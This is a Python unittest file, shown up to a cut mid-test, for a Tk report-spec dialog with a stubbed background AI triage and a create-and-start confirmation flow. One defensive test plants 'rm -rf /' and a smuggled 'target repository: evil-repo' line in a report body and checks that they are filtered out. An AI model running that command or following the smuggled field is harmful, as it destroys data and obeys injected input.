"""Acceptance-criteria edit dialog (DCC Task 11): ReportSpecDialog is built Tk-free here, the
same technique test_dev_control_center_reports_inbox_view.py already uses for ReportsInboxWindow
-- reports_spec_dialog's own `tk`/`ttk` module references are swapped for a small fake widget set
for the duration of each test, so the dialog's real __init__ / _on_create code runs unmodified
against fakes instead of a live display. No real Tk, no real LOCALAPPDATA: every test that writes
a spec file points specs_dir at a temp folder.

DCC Task 14 adds a background AI investigation that starts in __init__; every test here goes
through make_dialog(), whose default investigate_fn is a harmless no-result stub, so no test
ever calls the real triage.investigate (no real AI, no subprocess). Tests that care about the
investigation inject their own fake investigate_fn (a plain function of
(report, *, stop_event) -> TriageOutcome), exactly like reports_triage.investigate's own
contract -- never the real AI.
"""
from __future__ import annotations

import tempfile
import threading
import time
import tkinter as tk
import unittest
from pathlib import Path
from types import SimpleNamespace
from unittest import mock

from scripts.dev_control_center import reports_create_and_start as cas
from scripts.dev_control_center import reports_inbox as inbox
from scripts.dev_control_center import reports_spec_dialog as dialog_mod
from scripts.dev_control_center import reports_triage as triage


def make_report(**overrides) -> inbox.Report:
    fields = dict(
        app_key="next-day-setup", app_display_name="夕食料飲システム", file_name="r.json", schema_version=1,
        report_id="r1", created_at="2026-01-01T00:00:00Z", kind="bug", severity="stopped",
        title="タイトル", body="本文", reporter="yamada", app_id="next-day-setup",
        display_name="夕食料飲システム", release_id="rel-1", git_commit="a" * 40, version_source="BUILD_INFO.txt",
        pc_name="FRONT-PC1",
    )
    fields.update(overrides)
    return inbox.Report(**fields)


class _FakeVar:
    def __init__(self, value=None, **_kwargs):
        self._value = value

    def get(self):
        return self._value

    def set(self, value):
        self._value = value


class _FakeTkWidget:
    def __init__(self, master=None, *, text=None, **_kwargs):
        self.master = master
        self.text = text

    def pack(self, **_kwargs):
        pass

    def grid(self, **_kwargs):
        pass

    def configure(self, **_kwargs):
        pass


class _FakeButton(_FakeTkWidget):
    def __init__(self, master=None, *, command=None, text=None, **kwargs):
        super().__init__(master, **kwargs)
        self.command = command
        self.text = text
        self._disabled = False

    def state(self, states):
        for s in states:
            if s == "disabled":
                self._disabled = True
            elif s == "!disabled":
                self._disabled = False

    def instate(self, states):
        for s in states:
            if s == "disabled" and not self._disabled:
                return False
            if s == "!disabled" and self._disabled:
                return False
        return True


class _FakeText:
    def __init__(self, master=None, **_kwargs):
        self.content = ""
        self._handlers: dict = {}

    def configure(self, **_kwargs):
        pass

    def pack(self, **_kwargs):
        pass

    def grid(self, **_kwargs):
        pass

    def delete(self, _start, _end):
        self.content = ""

    def insert(self, _index, text):
        self.content += text

    def get(self, _start, _end):
        return self.content

    def bind(self, event, handler):
        self._handlers[event] = handler

    def type(self, text: str) -> None:
        """Test helper: append text the way a human typing would, then fire <KeyRelease> the
        same way the real dialog's binding would after each keystroke."""
        self.insert("end", text)
        handler = self._handlers.get("<KeyRelease>")
        if handler is not None:
            handler(None)


class _FakeToplevel:
    def __init__(self, master=None):
        self.master = master
        self._destroyed = False
        self._after_calls: dict[int, object] = {}
        self._after_seq = 0
        self._handlers: dict = {}

    def title(self, _text):
        pass

    def geometry(self, _spec):
        pass

    def minsize(self, _w, _h):
        pass

    def configure(self, **_kwargs):
        pass

    def protocol(self, _name, _func):
        pass

    def bind(self, event, handler):
        self._handlers[event] = handler

    def after(self, _ms, func):
        self._after_seq += 1
        self._after_calls[self._after_seq] = func
        return self._after_seq

    def after_cancel(self, token):
        self._after_calls.pop(token, None)

    def winfo_exists(self):
        return not self._destroyed

    def destroy(self):
        """Real Tk fires <Destroy> on a widget whether it is destroyed directly or as part of
        a parent's own destroy() cascading down its whole widget tree; this fake mirrors that
        so tests can simulate "the parent window closed" without a real Tk hierarchy."""
        if self._destroyed:
            return
        handler = self._handlers.get("<Destroy>")
        self._destroyed = True
        if handler is not None:
            handler(None)


def _no_result_investigate(_report, *, stop_event):
    """Default stub for make_dialog(): harmless, instant, never the real AI."""
    return triage.TriageOutcome(None, "", False)


_FAKE_TK_MODULE = SimpleNamespace(Toplevel=_FakeToplevel, StringVar=_FakeVar, Text=_FakeText, TclError=tk.TclError)
_FAKE_TTK_MODULE = SimpleNamespace(Frame=_FakeTkWidget, Label=_FakeTkWidget, Button=_FakeButton)


class ReportSpecDialogCase(unittest.TestCase):
    def setUp(self):
        tk_patch = mock.patch.object(dialog_mod, "tk", _FAKE_TK_MODULE)
        tk_patch.start()
        self.addCleanup(tk_patch.stop)
        ttk_patch = mock.patch.object(dialog_mod, "ttk", _FAKE_TTK_MODULE)
        ttk_patch.start()
        self.addCleanup(ttk_patch.stop)

    def make_dialog(self, report=None, *, on_created=None, target_repo="next-day-setup",
                     investigate_fn=None, current_roles=None, create_and_start_fn=None,
                     resolve_repo_dir_for_confirm=None):
        report = report or make_report()
        return dialog_mod.ReportSpecDialog(
            object(), report, target_repo=target_repo, on_created=on_created,
            investigate_fn=investigate_fn or _no_result_investigate, current_roles=current_roles,
            create_and_start_fn=create_and_start_fn, resolve_repo_dir_for_confirm=resolve_repo_dir_for_confirm)


class TemplateAndSummaryTests(ReportSpecDialogCase):
    def test_criteria_box_starts_with_the_three_line_template(self):
        d = self.make_dialog()
        self.assertEqual(d.criteria_text.content, "\n".join(inbox.SPEC_CRITERIA_TEMPLATE))

    def test_summary_shows_kind_app_title_and_is_read_only_in_content(self):
        report = make_report(kind="request", title="画面が遅い", body="詳しい手順...")
        d = self.make_dialog(report)
        summary = d.summary_text.content
        self.assertIn("仕様変更の希望", summary)
        self.assertIn("夕食料飲システム", summary)
        self.assertIn("画面が遅い", summary)
        self.assertIn("詳しい手順", summary)

    def test_consultation_report_also_gets_the_same_template(self):
        report = make_report(kind="request")
        d = self.make_dialog(report)
        self.assertEqual(d.criteria_text.content, "\n".join(inbox.SPEC_CRITERIA_TEMPLATE))


class ValidationTests(ReportSpecDialogCase):
    def test_empty_criteria_shows_a_japanese_reason_and_creates_nothing(self):
        with tempfile.TemporaryDirectory() as tmp:
            created = []
            d = self.make_dialog(on_created=created.append)
            d.criteria_text.delete("1.0", "end")
            with mock.patch.object(inbox, "specs_root", return_value=Path(tmp)):
                d._on_create()
            self.assertTrue(d.notice_var.get())
            self.assertEqual(created, [])
            self.assertEqual(list(Path(tmp).iterdir()), [])
            self.assertTrue(d.window.winfo_exists())  # dialog stays open on failure

    def test_too_many_lines_shows_a_japanese_reason_and_creates_nothing(self):
        with tempfile.TemporaryDirectory() as tmp:
            created = []
            d = self.make_dialog(on_created=created.append)
            d.criteria_text.delete("1.0", "end")
            d.criteria_text.insert("1.0", "\n".join(f"条件{i}" for i in range(21)))
            with mock.patch.object(inbox, "specs_root", return_value=Path(tmp)):
                d._on_create()
            self.assertTrue(d.notice_var.get())
            self.assertEqual(created, [])
            self.assertEqual(list(Path(tmp).iterdir()), [])

    def test_a_too_long_line_shows_a_japanese_reason_and_creates_nothing(self):
        with tempfile.TemporaryDirectory() as tmp:
            created = []
            d = self.make_dialog(on_created=created.append)
            d.criteria_text.delete("1.0", "end")
            d.criteria_text.insert("1.0", "x" * 1001)
            with mock.patch.object(inbox, "specs_root", return_value=Path(tmp)):
                d._on_create()
            self.assertTrue(d.notice_var.get())
            self.assertEqual(created, [])
            self.assertEqual(list(Path(tmp).iterdir()), [])


class LiveValidationTests(ReportSpecDialogCase):
    """Review fix: the create button must reflect validity as the human types, not only after
    they press it (previously create_button stayed enabled while the box held invalid input)."""

    def test_the_valid_template_starts_with_the_create_button_enabled_and_no_notice(self):
        d = self.make_dialog()
        self.assertTrue(d.create_button.instate(["!disabled"]))
        self.assertEqual(d.notice_var.get(), "")

    def test_clearing_all_criteria_disables_the_button_and_shows_a_japanese_notice(self):
        d = self.make_dialog()
        d.criteria_text.delete("1.0", "end")
        d.criteria_text.type("")  # fires <KeyRelease> on the now-empty box
        self.assertTrue(d.create_button.instate(["disabled"]))
        self.assertTrue(d.notice_var.get())

    def test_restoring_valid_input_re_enables_the_button(self):
        d = self.make_dialog()
        d.criteria_text.delete("1.0", "end")
        d.criteria_text.type("")
        self.assertTrue(d.create_button.instate(["disabled"]))
        d.criteria_text.type("条件A")
        self.assertTrue(d.create_button.instate(["!disabled"]))
        self.assertEqual(d.notice_var.get(), "")

    def test_too_many_lines_disables_the_button_while_typed(self):
        d = self.make_dialog()
        d.criteria_text.delete("1.0", "end")
        d.criteria_text.type("\n".join(f"条件{i}" for i in range(21)))
        self.assertTrue(d.create_button.instate(["disabled"]))
        self.assertTrue(d.notice_var.get())


class SuccessAndFailureTests(ReportSpecDialogCase):
    def test_confirming_writes_a_spec_file_and_calls_on_created_then_closes(self):
        with tempfile.TemporaryDirectory() as tmp:
            created = []
            report = make_report(body="一意なマーカーABCDEF")
            d = self.make_dialog(report, on_created=created.append)
            with mock.patch.object(inbox, "specs_root", return_value=Path(tmp)):
                d._on_create()
            self.assertEqual(len(created), 1)
            path = created[0]
            spec = inbox.taskspec.load_spec_file(path)
            self.assertEqual(spec.target_repo, "next-day-setup")
            self.assertNotIn("一意なマーカーABCDEF", path.read_text(encoding="utf-8"))
            self.assertFalse(d.window.winfo_exists())  # dialog closes on success

    def test_write_failure_shows_a_japanese_message_without_path_or_exception_text(self):
        report = make_report()
        d = self.make_dialog(report)
        with mock.patch.object(inbox, "create_spec_file",
                                side_effect=inbox.SpecCreateError("仕様ファイルを保存できませんでした。")):
            d._on_create()
        self.assertEqual(d.notice_var.get(), "仕様ファイルを保存できませんでした。")
        self.assertTrue(d.window.winfo_exists())


class InvestigationThreadingTests(ReportSpecDialogCase):
    """DCC Task 14仕様1: investigation runs on a background thread; editing and 仕様ファイルを
    作る must stay usable even while a (fake) AI call never returns."""

    def test_editing_and_create_work_while_investigation_is_still_running(self):
        block = threading.Event()
        self.addCleanup(block.set)

        def never_returns(_report, *, stop_event):
            block.wait(5)
            return triage.TriageOutcome(None, "", False)

        with tempfile.TemporaryDirectory() as tmp:
            created = []
            d = self.make_dialog(on_created=created.append, investigate_fn=never_returns)
            self.assertTrue(d.create_button.instate(["!disabled"]))
            d.criteria_text.type("追加の条件")
            with mock.patch.object(inbox, "specs_root", return_value=Path(tmp)):
                d._on_create()
            self.assertEqual(len(created), 1)
            self.assertFalse(d.window.winfo_exists())

    def test_closing_the_dialog_stops_the_investigation_and_a_late_tick_touches_nothing(self):
        def waits_for_stop(_report, *, stop_event):
            stop_event.wait(5)
            return triage.TriageOutcome(None, "", False)

        d = self.make_dialog(investigate_fn=waits_for_stop)
        d._close()
        self.assertTrue(d._stop_event.is_set())
        self.assertFalse(d.window.winfo_exists())
        d._investigation_thread.join(timeout=5)
        d._tick()  # closed guard: must not touch any (destroyed) widget
        self.assertIsNone(d._triage_outcome)

    def test_a_parent_window_destroying_this_dialog_also_stops_the_investigation(self):
        """Review fix: ReportsInboxView.close() destroys its own Toplevel, which cascades down
        to this dialog's Toplevel without ever calling the dialog's own _close(). The dialog
        must still stop its background investigation and never touch a widget afterwards."""
        def waits_for_stop(_report, *, stop_event):
            stop_event.wait(5)
            return triage.TriageOutcome(None, "", False)

        d = self.make_dialog(investigate_fn=waits_for_stop)
        d.window.destroy()  # simulates the parent's destroy() cascading to this Toplevel
        self.assertTrue(d._stop_event.is_set())
        self.assertTrue(d._closed)
        d._investigation_thread.join(timeout=5)
        d._tick()  # closed guard: must not touch any (destroyed) widget
        self.assertIsNone(d._triage_outcome)


class TriageResultRenderingTests(ReportSpecDialogCase):
    def _settle(self, d):
        d._investigation_thread.join(timeout=5)
        d._tick()

    def test_successful_outcome_is_shown_and_enables_the_apply_button(self):
        result = triage.TriageResult(
            classification="bug", confidence="low", evidence="根拠E",
            suspected_locations=("foo/bar.py:XXX",), criteria_draft=("条件1", "条件2"),
            reply_draft="返信草案")
        outcome = triage.TriageOutcome(result, "", True)
        d = self.make_dialog(investigate_fn=lambda report, *, stop_event: outcome)
        self._settle(d)
        shown = d.triage_result_text.content
        self.assertIn("バグ", shown)
        self.assertIn("確信度は低め", shown)  # low-confidence bug gets an explicit callout
        self.assertIn("foo/bar.py:XXX", shown)
        self.assertIn("返信草案", shown)
        # criteria_draft itself is intentionally not duplicated into this read-only panel
        # (仕様5 lists only 仕分け/確信度/根拠/修正箇所の候補/返信の下書き); it reaches the
        # human through the editable criteria box, only after 受入条件の下書きを反映.
        self.assertNotIn("条件1", shown)
        self.assertTrue(d.apply_criteria_button.instate(["!disabled"]))

    def test_code_unavailable_outcome_says_so(self):
        result = triage.TriageResult("insufficient_info", "medium", "E", (), (), "返信")
        outcome = triage.TriageOutcome(result, "", False)
        d = self.make_dialog(investigate_fn=lambda report, *, stop_event: outcome)
        self._settle(d)
        self.assertIn("コードを読めなかった", d.triage_result_text.content)
        self.assertTrue(d.apply_criteria_button.instate(["disabled"]))  # no criteria_draft

    def test_code_unavailable_outcome_names_the_classified_reason(self):
        """DCC Task 14.3: when the AI investigation knows *why* no working folder was found
        (the app_key isn't registered, as happened for 夕食料飲システム), the dialog must show
        that fixed Japanese reason, not just the generic Task 14 note."""
        result = triage.TriageResult("insufficient_info", "medium", "E", (), (), "返信")
        outcome = triage.TriageOutcome(result, "", False, triage.CODE_UNAVAILABLE_REASON_NOT_REGISTERED)
        d = self.make_dialog(investigate_fn=lambda report, *, stop_event: outcome)
        self._settle(d)
        self.assertIn("このアプリがリポジトリに登録されていません", d.triage_result_text.content)

    def test_failed_outcome_shows_the_japanese_reason_and_leaves_the_template_usable(self):
        d = self.make_dialog(investigate_fn=lambda report, *, stop_event:
                              triage.TriageOutcome(None, "調査できませんでした。", False))
        self._settle(d)
        self.assertEqual(d.triage_status_var.get(), "調査できませんでした。")
        self.assertTrue(d.apply_criteria_button.instate(["disabled"]))
        self.assertEqual(d.criteria_text.content, "\n".join(inbox.SPEC_CRITERIA_TEMPLATE))
        self.assertTrue(d.create_button.instate(["!disabled"]))

    def test_failed_outcome_with_code_unavailable_still_names_the_classified_reason(self):
        """DCC Task 14.3 review fix: when code_available is False *and* the AI call itself also
        failed (timeout / unavailable / unreadable output -- result is None), the dialog must
        still show the fixed-phrase reason, not silently drop it the way the generic failure
        message alone would. Must never include a path or exception text."""
        outcome = triage.TriageOutcome(
            None, "調査できませんでした。", False, triage.CODE_UNAVAILABLE_REASON_FOLDER_MISSING)
        d = self.make_dialog(investigate_fn=lambda report, *, stop_event: outcome)
        self._settle(d)
        self.assertEqual(d.triage_status_var.get(), "調査できませんでした。")
        shown = d.triage_result_text.content
        self.assertIn("リポジトリのフォルダが見つかりません", shown)
        self.assertNotIn("\\", shown)
        self.assertNotIn("/", shown)
        self.assertTrue(d.apply_criteria_button.instate(["disabled"]))

    def test_failed_outcome_with_code_available_shows_no_unavailable_note(self):
        """The opposite case: an AI-call failure with a working folder that *was* found must not
        gain a spurious "could not read the code" note."""
        outcome = triage.TriageOutcome(None, "調査が時間切れになりました。", True)
        d = self.make_dialog(investigate_fn=lambda report, *, stop_event: outcome)
        self._settle(d)
        self.assertEqual(d.triage_result_text.content, "")


class ApplyCriteriaDraftTests(ReportSpecDialogCase):
    def _dialog_with_draft(self, criteria_draft=("AIの条件A",)):
        result = triage.TriageResult("bug", "high", "E", (), criteria_draft, "返信")
        outcome = triage.TriageOutcome(result, "", True)
        d = self.make_dialog(investigate_fn=lambda report, *, stop_event: outcome)
        d._investigation_thread.join(timeout=5)
        d._tick()
        return d

    def test_apply_replaces_the_untouched_template_without_asking(self):
        d = self._dialog_with_draft()
        with mock.patch.object(dialog_mod, "messagebox") as mb:
            d._apply_criteria_draft()
            mb.askyesno.assert_not_called()
        self.assertEqual(d.criteria_text.content, "AIの条件A")

    def test_apply_asks_before_overwriting_human_edits_and_keeps_them_on_decline(self):
        d = self._dialog_with_draft()
        d.criteria_text.delete("1.0", "end")
        d.criteria_text.type("人が書いた条件")
        with mock.patch.object(dialog_mod, "messagebox") as mb:
            mb.askyesno.return_value = False
            d._apply_criteria_draft()
            mb.askyesno.assert_called_once()
        self.assertEqual(d.criteria_text.content, "人が書いた条件")

    def test_apply_replaces_human_edits_after_confirmation(self):
        d = self._dialog_with_draft()
        d.criteria_text.delete("1.0", "end")
        d.criteria_text.type("人が書いた条件")
        with mock.patch.object(dialog_mod, "messagebox") as mb:
            mb.askyesno.return_value = True
            d._apply_criteria_draft()
        self.assertEqual(d.criteria_text.content, "AIの条件A")

    def test_apply_asks_even_when_the_box_was_edited_to_empty_and_keeps_it_empty_on_decline(self):
        """Review fix: deleting every line is still a human edit away from the template, so it
        must go through the same overwrite confirmation as any other edit -- the previous
        `if current and ...` guard skipped confirmation for this exact case because an empty
        list is falsy."""
        d = self._dialog_with_draft()
        d.criteria_text.delete("1.0", "end")
        with mock.patch.object(dialog_mod, "messagebox") as mb:
            mb.askyesno.return_value = False
            d._apply_criteria_draft()
            mb.askyesno.assert_called_once()
        self.assertEqual(d.criteria_text.content, "")

    def test_apply_does_nothing_when_there_is_no_criteria_draft(self):
        d = self._dialog_with_draft(criteria_draft=())
        original = d.criteria_text.content
        d._apply_criteria_draft()
        self.assertEqual(d.criteria_text.content, original)


class CreateAndStartButtonStateTests(ReportSpecDialogCase):
    """DCC Task 14.5仕様1/C4/C16: 作成して開始 is enabled only once the investigation concluded
    バグ or 変更要望; a still-running, failed, 質問 or 情報不足 investigation leaves it disabled."""

    def _settle(self, d):
        d._investigation_thread.join(timeout=5)
        d._tick()

    def test_disabled_while_investigation_is_still_running(self):
        block = threading.Event()
        self.addCleanup(block.set)

        def never_returns(_report, *, stop_event):
            block.wait(5)
            return triage.TriageOutcome(None, "", False)

        d = self.make_dialog(investigate_fn=never_returns)
        self.assertTrue(d.create_and_start_button.instate(["disabled"]))

    def test_disabled_when_the_investigation_failed(self):
        d = self.make_dialog(investigate_fn=lambda report, *, stop_event:
                              triage.TriageOutcome(None, "調査できませんでした。", False))
        self._settle(d)
        self.assertTrue(d.create_and_start_button.instate(["disabled"]))

    def test_enabled_for_bug(self):
        result = triage.TriageResult("bug", "high", "E", (), (), "返信")
        d = self.make_dialog(investigate_fn=lambda report, *, stop_event: triage.TriageOutcome(result, "", True))
        self._settle(d)
        self.assertTrue(d.create_and_start_button.instate(["!disabled"]))

    def test_enabled_for_feature_request(self):
        result = triage.TriageResult("feature_request", "medium", "E", (), (), "返信")
        d = self.make_dialog(investigate_fn=lambda report, *, stop_event: triage.TriageOutcome(result, "", True))
        self._settle(d)
        self.assertTrue(d.create_and_start_button.instate(["!disabled"]))

    def test_disabled_for_spec_misunderstanding(self):
        result = triage.TriageResult("spec_misunderstanding", "high", "E", (), (), "返信")
        d = self.make_dialog(investigate_fn=lambda report, *, stop_event: triage.TriageOutcome(result, "", True))
        self._settle(d)
        self.assertTrue(d.create_and_start_button.instate(["disabled"]))

    def test_disabled_for_insufficient_info(self):
        result = triage.TriageResult("insufficient_info", "medium", "E", (), (), "返信")
        d = self.make_dialog(investigate_fn=lambda report, *, stop_event: triage.TriageOutcome(result, "", True))
        self._settle(d)
        self.assertTrue(d.create_and_start_button.instate(["disabled"]))


class CreateAndStartConfirmDialogTests(ReportSpecDialogCase):
    """DCC Task 14.5仕様2/3: the confirmation dialog opened by 作成して開始, and what happens on
    キャンセル vs 作成して開始. create_and_start_fn is always a fake here -- no real spec file,
    no real Orchestrator start, no real registry lookup."""

    def _settled_dialog(self, *, criteria_draft=("AIの条件1",), suspected_locations=("foo.py:1",),
                         classification="bug", create_and_start_fn=None, current_roles=None,
                         resolve_repo_dir_for_confirm=None, report=None):
        result = triage.TriageResult(classification, "high", "E", suspected_locations, criteria_draft, "返信")
        outcome = triage.TriageOutcome(result, "", True)
        d = self.make_dialog(
            report=report, investigate_fn=lambda r, *, stop_event: outcome,
            create_and_start_fn=create_and_start_fn, current_roles=current_roles,
            resolve_repo_dir_for_confirm=resolve_repo_dir_for_confirm)
        d._investigation_thread.join(timeout=5)
        d._tick()
        return d

    def _settle_start(self, confirm) -> None:
        """create_and_start_fn now runs on a background thread (review fix, iteration 2) exactly
        like OrchestratorWindow._confirm_start -- every test that presses 作成して開始 must join
        that thread and drain the result via one _tick(), the same way _settled_dialog already
        does for the parent dialog's own background investigation."""
        confirm._start_thread.join(timeout=5)
        confirm._tick()

    def test_press_opens_a_confirm_dialog_with_the_expected_display_fields(self):
        report = make_report(app_display_name="夕食料飲システム", kind="request")
        d = self._settled_dialog(
            report=report, current_roles=lambda: ("claude", "codex"),
            resolve_repo_dir_for_confirm=lambda app_key: Path(r"C:\x\next-day-setup"))
        d._on_create_and_start()
        confirm = d._confirm_dialog
        info = confirm._confirm_info
        self.assertEqual(info.app_display_name, "夕食料飲システム")
        self.assertEqual(info.repo_display_name, "next-day-setup")
        self.assertEqual(info.roles_text, "Main = Claude / Reviewer = Codex")
        self.assertEqual(info.task_title, "DCC報告対応（仕様変更の希望）")
        self.assertTrue(confirm.exists())

    def test_confirm_dialog_shows_the_live_criteria_count(self):
        """C3: 件数 is shown and stays in sync as either box is edited."""
        d = self._settled_dialog(
            criteria_draft=("AIの条件1",), suspected_locations=(),
            resolve_repo_dir_for_confirm=lambda app_key: None)
        d._on_create_and_start()
        confirm = d._confirm_dialog
        # 3 template lines (base) + 1 AI-suggested line.
        self.assertEqual(confirm.criteria_count_var.get(), "受入条件: 4件")
        confirm.ai_text.type("\n追加条件")
        self.assertEqual(confirm.criteria_count_var.get(), "受入条件: 5件")

    def test_confirm_dialog_prefills_the_base_box_from_the_parent_criteria_and_the_ai_box_is_labeled(self):
        d = self._settled_dialog(
            criteria_draft=("AIの条件1", "AIの条件2"), suspected_locations=("foo.py:1",),
            resolve_repo_dir_for_confirm=lambda app_key: None)
        d.criteria_text.delete("1.0", "end")
        d.criteria_text.insert("1.0", "人が編集した条件")
        d._on_create_and_start()
        confirm = d._confirm_dialog
        self.assertEqual(confirm.base_text.content, "人が編集した条件")
        self.assertEqual(confirm.ai_text.content, "AIの条件1\nAIの条件2\n修正箇所の候補: foo.py:1")
        # C7/C1: the "AIの推測（未確認）" heading is actually rendered next to the editable box,
        # not just present as a module constant.
        heading_shown = any("AIの推測（未確認）" in (label.text or "") for label in confirm._labels)
        self.assertTrue(heading_shown)

    def test_button_is_disabled_until_create_and_start_is_pressed_so_nothing_happens_on_open(self):
        calls = []
        d = self._settled_dialog(
            create_and_start_fn=lambda *a, **k: calls.append((a, k)),
            resolve_repo_dir_for_confirm=lambda app_key: None)
        d._on_create_and_start()
        self.assertEqual(calls, [])

    def test_cancel_creates_nothing_and_starts_nothing(self):
        calls = []

        def fake_create_and_start(report, criteria, *, main_agent, review_agent):
            calls.append((report, criteria, main_agent, review_agent))
            return cas.StartResult(True, spec_path=Path("/should/not/matter"))

        created = []
        d = self._settled_dialog(
            create_and_start_fn=fake_create_and_start, resolve_repo_dir_for_confirm=lambda app_key: None)
        d._on_created = created.append
        d._on_create_and_start()
        confirm = d._confirm_dialog
        confirm._cancel()
        self.assertEqual(calls, [])
        self.assertEqual(created, [])
        self.assertFalse(confirm.exists())
        self.assertTrue(d.window.winfo_exists())  # the parent dialog stays open

    def test_create_and_start_writes_once_decides_repo_from_registry_and_closes_both_dialogs(self):
        calls = []

        def fake_create_and_start(report, criteria, *, main_agent, review_agent):
            calls.append({"report": report, "criteria": criteria, "main_agent": main_agent,
                          "review_agent": review_agent})
            return cas.StartResult(True, spec_path=Path("/fake/spec.json"), run_dir=Path("/fake/run"))

        created = []
        d = self._settled_dialog(
            criteria_draft=("AIの条件1",), suspected_locations=(),
            create_and_start_fn=fake_create_and_start, current_roles=lambda: ("claude", "codex"),
            resolve_repo_dir_for_confirm=lambda app_key: Path(r"C:\x\next-day-setup"))
        d._on_created = created.append
        d._on_create_and_start()
        confirm = d._confirm_dialog
        confirm._on_start()
        self._settle_start(confirm)
        self.assertEqual(len(calls), 1)
        call = calls[0]
        self.assertEqual(call["main_agent"], "claude")
        self.assertEqual(call["review_agent"], "codex")
        self.assertEqual(call["criteria"], list(inbox.SPEC_CRITERIA_TEMPLATE) + ["AIの条件1"])
        self.assertEqual(created, [Path("/fake/spec.json")])
        self.assertFalse(confirm.exists())
        self.assertFalse(d.window.winfo_exists())  # success closes the parent dialog too

    def test_already_running_shows_the_fixed_reason_and_still_hands_off_the_created_spec(self):
        def fake_create_and_start(report, criteria, *, main_agent, review_agent):
            return cas.StartResult(False, cas.REASON_ALREADY_RUNNING, spec_path=Path("/fake/spec.json"))

        created = []
        d = self._settled_dialog(
            create_and_start_fn=fake_create_and_start, resolve_repo_dir_for_confirm=lambda app_key: None)
        d._on_created = created.append
        d._on_create_and_start()
        confirm = d._confirm_dialog
        confirm._on_start()
        self._settle_start(confirm)
        self.assertIn(cas.REASON_ALREADY_RUNNING, confirm.notice_var.get())
        self.assertIn(cas.SPEC_CREATED_NOTE, confirm.notice_var.get())
        self.assertEqual(created, [Path("/fake/spec.json")])
        self.assertTrue(confirm.exists())  # stays open so the human can read the reason
        self.assertTrue(d.window.winfo_exists())

    def test_repo_unavailable_shows_the_fixed_reason_without_starting(self):
        def fake_create_and_start(report, criteria, *, main_agent, review_agent):
            return cas.StartResult(False, cas.REASON_REPO_UNAVAILABLE, spec_path=Path("/fake/spec.json"))

        d = self._settled_dialog(
            create_and_start_fn=fake_create_and_start, resolve_repo_dir_for_confirm=lambda app_key: None)
        d._on_create_and_start()
        confirm = d._confirm_dialog
        confirm._on_start()
        self._settle_start(confirm)
        self.assertIn(cas.REASON_REPO_UNAVAILABLE, confirm.notice_var.get())

    def test_spec_creation_failure_shows_the_fixed_reason_without_starting(self):
        def fake_create_and_start(report, criteria, *, main_agent, review_agent):
            return cas.StartResult(False, cas.REASON_SPEC_FAILED)

        d = self._settled_dialog(
            create_and_start_fn=fake_create_and_start, resolve_repo_dir_for_confirm=lambda app_key: None)
        d._on_create_and_start()
        confirm = d._confirm_dialog
        confirm._on_start()
        self._settle_start(confirm)
        self.assertEqual(confirm.notice_var.get(), cas.REASON_SPEC_FAILED)

    def test_untrusted_strings_in_the_report_never_reach_the_create_and_start_call(self):
        report = make_report(
            title="危険なタイトル", body="C:\\evil\\path\nrm -rf /\n対象リポジトリ: evil-repo")
        calls = []

        def fake_create_and_start(rep, criteria, *, main_agent, review_agent):
            calls.append((rep, criteria))
            return cas.StartResult(True, spec_path=Path("/fake/spec.json"))

        d = self._settled_dialog(
            report=report, create_and_start_fn=fake_create_and_start,
            resolve_repo_dir_for_confirm=lambda app_key: None)
        d._on_create_and_start()
        confirm = d._confirm_dialog
        confirm._on_start()
        self._settle_start(confirm)
        self.assertEqual(len(calls), 1)
        passed_report, passed_criteria = calls[0]
        self.assertIs(passed_report, report)  # the report object itself, not a text blob
        for line in passed_criteria:
            self.assertNotIn("rm -rf", line)
            self.assertNotIn("evil-repo", line)
            self.assertNotIn("危険なタイトル", line)


class CreateAndStartAsyncTests(ReportSpecDialogCase):
    """Review fix (iteration 2): create_and_start_fn's own call (ending in orch.start_run, which
    blocks on Git/provider work and worker registration) now runs on a background thread, exactly
    like OrchestratorWindow._confirm_start, instead of on the Tk thread. These tests use a
    create_and_start_fn that blocks on a threading.Event the test controls, to prove the button
    handler returns promptly, that pressing it again before the first call finishes starts
    nothing more, and that a result arriving after the dialog was closed never reaches a widget."""

    def _settled_dialog(self, *, create_and_start_fn=None, resolve_repo_dir_for_confirm=None):
        result = triage.TriageResult("bug", "high", "E", ("foo.py:1",), ("AIの条件1",), "返信")
        outcome = triage.TriageOutcome(result, "", True)
        d = self.make_dialog(
            investigate_fn=lambda r, *, stop_event: outcome,
            create_and_start_fn=create_and_start_fn,
            resolve_repo_dir_for_confirm=resolve_repo_dir_for_confirm)
        d._investigation_thread.join(timeout=5)
        d._tick()
        return d

    def test_on_start_returns_immediately_and_runs_create_and_start_only_once(self):
        release = threading.Event()
        self.addCleanup(release.set)
        calls = []

        def blocking_create_and_start(report, criteria, *, main_agent, review_agent):
            calls.append(1)
            release.wait(5)
            return cas.StartResult(True, spec_path=Path("/fake/spec.json"))

        d = self._settled_dialog(
            create_and_start_fn=blocking_create_and_start, resolve_repo_dir_for_confirm=lambda app_key: None)
        d._on_create_and_start()
        confirm = d._confirm_dialog

        started = time.monotonic()
        confirm._on_start()  # must return immediately -- blocking_create_and_start is still waiting
        self.assertTrue(confirm.start_button.instate(["disabled"]))
        confirm._on_start()  # re-entrant presses while the first call is still in flight: no-ops
        confirm._on_start()
        self.assertLess(time.monotonic() - started, 2.0)

        release.set()
        confirm._start_thread.join(timeout=5)
        confirm._tick()
        self.assertEqual(len(calls), 1)  # create_and_start_fn itself only ever ran once
        self.assertFalse(confirm.exists())  # success closes the dialog

    def test_closing_the_dialog_while_starting_drops_a_result_that_arrives_afterwards(self):
        release = threading.Event()
        self.addCleanup(release.set)

        def blocking_create_and_start(report, criteria, *, main_agent, review_agent):
            release.wait(5)
            return cas.StartResult(True, spec_path=Path("/fake/spec.json"))

        results = []
        d = self._settled_dialog(
            create_and_start_fn=blocking_create_and_start, resolve_repo_dir_for_confirm=lambda app_key: None)
        d._on_create_and_start()
        confirm = d._confirm_dialog
        confirm._on_result = results.append
        confirm._on_start()
        confirm._cancel()  # closes the confirmation dialog while the fake start is still running
        self.assertTrue(confirm._closed)
        self.assertFalse(confirm.exists())

        release.set()
        confirm._start_thread.join(timeout=5)
        confirm._tick()  # closed guard: must not touch any (destroyed) widget or call on_result
        self.assertEqual(results, [])

    def test_a_parent_window_destroying_this_dialog_also_marks_it_closed(self):
        """Mirrors ReportSpecDialog's own cascade-destroy handling (DCC Task 14仕様1 review fix):
        a parent Toplevel's destroy() tearing down this dialog's Toplevel must be treated the
        same as キャンセル for the purpose of dropping a start result that arrives afterwards."""
        d = self._settled_dialog(resolve_repo_dir_for_confirm=lambda app_key: None)
        d._on_create_and_start()
        confirm = d._confirm_dialog
